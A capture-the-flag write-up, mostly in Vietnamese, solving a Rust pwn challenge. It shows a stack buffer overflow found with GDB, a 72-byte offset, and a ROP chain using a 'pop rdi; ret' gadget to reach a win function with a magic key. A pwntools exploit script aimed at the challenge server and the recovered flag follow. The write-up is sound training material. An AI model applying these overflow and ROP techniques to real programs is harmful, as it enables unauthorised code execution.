# PWN
*Stumbled upon Rust recently, still learning the ropes...*
## Tóm tắt
Mã nhị phân làm rò rỉ địa chỉ của ngăn xếp, chương trình Rust này bị lỗi buffer overflow khi buf chỉ có 64 byte nhưng read đọc vào 512 byte vượt quá số lượng cho phép,tận dụng lỗi và kết hợp kĩ thuật để sửa đổi Key thỏa điều kiện ta sẽ chiếm được shellcode
## Khai thác 
**Tool:GDB** 
1. Tìm khoảng cách giữa địa chỉ buff và địa chỉ ret 
```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x000000000023c5a0 <+0>:     push   rbp
   0x000000000023c5a1 <+1>:     mov    rbp,rsp
   0x000000000023c5a4 <+4>:     mov    rdx,rsi
   0x000000000023c5a7 <+7>:     movsxd rsi,edi
   0x000000000023c5aa <+10>:    lea    rdi,[rip+0xffffffffffffffbf]        # 0x23c570 <_ZN5chall4main17he0a87d769b8e74caE>
   0x000000000023c5b1 <+17>:    xor    ecx,ecx
   0x000000000023c5b3 <+19>:    call   0x23c3f0 <_ZN3std2rt10lang_start17hef555f1651fdc621E>
   0x000000000023c5b8 <+24>:    pop    rbp
   0x000000000023c5b9 <+25>:    ret

```
vào hàm vuln (0x23c3f0)
```
pwndbg> disassemble 0x23c3f0
Dump of assembler code for function _ZN3std2rt10lang_start17hef555f1651fdc621E:
   0x000000000023c3f0 <+0>:     push   rbp
   0x000000000023c3f1 <+1>:     mov    rbp,rsp
   0x000000000023c3f4 <+4>:     sub    rsp,0x10
   0x000000000023c3f8 <+8>:     mov    eax,ecx
   0x000000000023c3fa <+10>:    mov    rcx,rdx
   0x000000000023c3fd <+13>:    mov    rdx,rsi
   0x000000000023c400 <+16>:    mov    QWORD PTR [rbp-0x8],rdi
   0x000000000023c404 <+20>:    lea    rdi,[rbp-0x8]
   0x000000000023c408 <+24>:    lea    rsi,[rip+0x9f019]        # 0x2db428
   0x000000000023c40f <+31>:    movzx  r8d,al
   0x000000000023c413 <+35>:    call   QWORD PTR [rip+0xa6337]        # 0x2e2750
   0x000000000023c419 <+41>:    mov    QWORD PTR [rbp-0x10],rax
   0x000000000023c41d <+45>:    mov    rax,QWORD PTR [rbp-0x10]
   0x000000000023c421 <+49>:    add    rsp,0x10
   0x000000000023c425 <+53>:    pop    rbp
   0x000000000023c426 <+54>:    ret
```
Phân tích file nhị phân trong IDA và đặt breakpoint tại call read(0x000000000023C564)
```
.text:000000000023C520                 push    rbp
.text:000000000023C521                 mov     rbp, rsp
.text:000000000023C524                 sub     rsp, 40h
.text:000000000023C528                 lea     rdi, [rbp+s]    ; s
.text:000000000023C52C                 xor     esi, esi        ; c
.text:000000000023C52E                 mov     edx, 40h        ; n
.text:000000000023C533                 call    _memset
.text:000000000023C538                 mov     rax, cs:stdout_ptr
.text:000000000023C53F                 mov     rdi, [rax]      ; stream
.text:000000000023C542                 xor     eax, eax
.text:000000000023C544                 mov     esi, eax        ; buf
.text:000000000023C546                 call    cs:setbuf_ptr
.text:000000000023C54C                 lea     rdi, aSaySomething ; "Say something:\n"
.text:000000000023C553                 call    cs:puts_ptr
.text:000000000023C559                 xor     edi, edi        ; fd
.text:000000000023C55B                 lea     rsi, [rbp+s]    ; buf
.text:000000000023C55F                 mov     edx, 200h       ; nbytes
.text:000000000023C564                 call    cs:read_ptr
.text:000000000023C56A                 add     rsp, 40h
.text:000000000023C56E                 pop     rbp
.text:000000000023C56F   
```
Sau đó run thì ta được địa chỉ bắt đầu của buff là 0x7fffffffdb00
```
0x23c564 <chall::vuln+68>    call   qword ptr [rip + 0xa621e]   <read>
        fd: 0 (/dev/pts/0)
        buf: 0x7fffffffdb00 ◂— 0
        nbytes: 0x200
 
   0x23c56a <chall::vuln+74>    add    rsp, 0x40
   0x23c56e <chall::vuln+78>    pop    rbp
   0x23c56f <chall::vuln+79>    ret    
 
   0x23c570 <chall::main>       push   rbp
   0x23c571 <chall::main+1>     mov    rbp, rsp
   0x23c574 <chall::main+4>     lea    rdi, [rip - 0x3877b]     RDI => 0x203e00 ◂— 'Welcome to my first Rust program!\n'
   0x23c57b <chall::main+11>    call   qword ptr [rip + 0xa61df]   <puts>
 
   0x23c581 <chall::main+17>    call   chall::vuln                 <chall::vuln>
 
   0x23c586 <chall::main+22>    lea    rdi, [rip - 0x3876a]     RDI => 0x203e23 ◂— 0xa21657942 /* 'Bye!\n' */
   0x23c58d <chall::main+29>    call   qword ptr [rip + 0xa61cd]   <puts>
──────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────
00:0000│ rsi rsp 0x7fffffffdb00 ◂— 0
... ↓            7 skipped
```
Continue rồi nhập pattern 'A'*200 ta có địa chỉ ret là 0x7fffffffdb48
```
b+ 0x23c564 <chall::vuln+68>    call   qword ptr [rip + 0xa621e]   <read>
 
   0x23c56a <chall::vuln+74>    add    rsp, 0x40
   0x23c56e <chall::vuln+78>    pop    rbp
 ► 0x23c56f <chall::vuln+79>    ret                                <0x4141414141414141>
    ↓





──────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdb48 ◂— 0x4141414141414141 ('AAAAAAAA')
01:0008│     0x7fffffffdb50 ◂— 0x7f0a61414141
02:0010│     0x7fffffffdb58 —▸ 0x23c4ba (core::ops::function::FnOnce::call_once+10) ◂— add rsp, 0x10
03:0018│     0x7fffffffdb60 ◂— 8
04:0020│     0x7fffffffdb68 —▸ 0x25fdb7 (std::thread::Thread::new_inner+71) ◂— mov r14, rax
05:0028│     0x7fffffffdb70 —▸ 0x7fffffffdb80 —▸ 0x7fffffffdba0 —▸ 0x7fffffffdce0 —▸ 0x7fffffffdd00 ◂— ...
06:0030│     0x7fffffffdb78 —▸ 0x23c469 (std::sys::backtrace::__rust_begin_short_backtrace+9) ◂— pop rbp
07:0038│     0x7fffffffdb80 —▸ 0x7fffffffdba0 —▸ 0x7fffffffdce0 —▸ 0x7fffffffdd00 —▸ 0x7fffffffdd10 ◂— ...

```
lấy địa chỉ ret-buff ta có khoảng cách là 72 byte

2.  Sử dụng kĩ thuật ROP/gadget để sửa đổi giá trị của key 
**TOOL:ROPgadget** 
Sử dụng tool để tìm địa chỉ của pop rdi ;ret (vì rdi chứa tham số đầu tiên là key): 0x000000000023c5ba 

```
OPgadget --binary ./chall --only "pop|ret"
Gadgets information
============================================================
0x000000000023c92a : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000023f57c : pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000023c92c : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000002564ee : pop r13 ; ret
0x000000000023c92e : pop r14 ; pop r15 ; pop rbp ; ret
0x000000000023cb94 : pop r14 ; pop rbp ; ret
0x000000000023c930 : pop r15 ; pop rbp ; ret
0x0000000000262452 : pop rax ; pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000023c92d : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000023c3cd : pop rbp ; ret
0x000000000023f57b : pop rbx ; pop r12 ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000023ca85 : pop rbx ; pop r14 ; pop r15 ; pop rbp ; ret
0x000000000023cb93 : pop rbx ; pop r14 ; pop rbp ; ret
0x000000000023c6e9 : pop rbx ; pop rbp ; ret
0x0000000000286d9f : pop rcx ; ret 0xfff7
0x000000000023c931 : pop rdi ; pop rbp ; ret
0x000000000023c5ba : pop rdi ; ret
0x000000000023c92f : pop rsi ; pop r15 ; pop rbp ; ret
```
3. Tìm địa chỉ của hàm **Win**
địa chỉ hàm win=0x000000000023c4e0
```
pwndbg> disas win
Dump of assembler code for function win:
   0x000000000023c4e0 <+0>:     push   rbp
   0x000000000023c4e1 <+1>:     mov    rbp,rsp
   0x000000000023c4e4 <+4>:     movabs rax,0xdeadbeefcafebabe
   0x000000000023c4ee <+14>:    cmp    rdi,rax
   0x000000000023c4f1 <+17>:    jne    0x23c502 <win+34>
   0x000000000023c4f3 <+19>:    lea    rdi,[rip+0xfffffffffffc6de6]        # 0x2032e0
   0x000000000023c4fa <+26>:    call   QWORD PTR [rip+0xa6258]        # 0x2e2758
   0x000000000023c500 <+32>:    pop    rbp
   0x000000000023c501 <+33>:    ret
   0x000000000023c502 <+34>:    lea    rdi,[rip+0xfffffffffffc6fb7]        # 0x2034c0
   0x000000000023c509 <+41>:    mov    rax,QWORD PTR [rip+0xa6250]        # 0x2e2760
   0x000000000023c510 <+48>:    call   rax
   0x000000000023c512 <+50>:    mov    rax,QWORD PTR [rip+0xa624f]        # 0x2e2768
   0x000000000023c519 <+57>:    mov    edi,0x1
   0x000000000023c51e <+62>:    call   rax
End of assembler dump.
```
Tương tự tìm địa chỉ của ret ta được 0x000000000023c334
4. Payload khi gửi
payload='A'*72 + pop_rdi_ret + 0xdeadbeefcafebabe + ret + win


5. viết script 
```
from pwn import *
#r=process("./chall")
r=remote("0.cloud.chals.io",31984)

payload=b"A"*72 + p64(0x000000000023c5ba)+ p64(0xdeadbeefcafebabe) +p64(0x000000000023c334)+ p64(0x23c4e0)  #padding + pop rdi; ret + Win
r.sendline(payload)
r.interactive()
```


## flag
FortID{1_D0n'7_Th1nk_Th1s_1s_H0w_Y0u'r3_Supp0s3d_T0_Wr1t3_C0d3_1n_Ru5t}





 